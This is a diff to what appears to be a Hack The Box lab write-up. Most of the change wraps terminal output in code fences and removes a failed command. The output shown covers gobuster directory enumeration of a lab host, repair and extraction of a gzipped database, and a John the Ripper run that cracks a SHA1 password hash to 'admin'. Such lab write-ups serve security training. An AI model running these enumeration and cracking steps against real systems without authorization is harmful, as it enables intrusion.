@@ -36,7 +36,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 47.75 seconds
 
 ```
-
+```bash
 gobuster dir -u http://10.129.186.91:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,txt
 ===============================================================
 Gobuster v3.1.0
@@ -55,8 +55,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 /index.php            (Status: 200) [Size: 0]
 /robots.txt           (Status: 200) [Size: 55]
-
-
+```
+```bash
 # git clone https://github.com/yonjar/fixgz.git
 Cloning into 'fixgz'...
 remote: Enumerating objects: 10, done.
@@ -111,12 +111,7 @@ drwxr-xr-x 3 root root  4096 Dec  6 20:37 ..
 -rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
 -rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
 drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
--rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
-                                                                                                                                                                                                                                           
-┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
-└─# cat db
-cat: db: No such file or directory
-                                                                                                                                                                                                                                           
+-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md                                                                                                                                                                                                                                        
 ┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
 └─# gunzip db.gz                                                                                                                                                                                                                       1 ⨯
                                                                                                                                                                                                                                            
@@ -153,3 +148,4 @@ admin            (?)
 1g 0:00:00:00 DONE 2/3 (2021-12-06 20:40) 100.0g/s 282400p/s 282400c/s 282400C/s Winnie..admin1
 Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
 Session completed.
+```
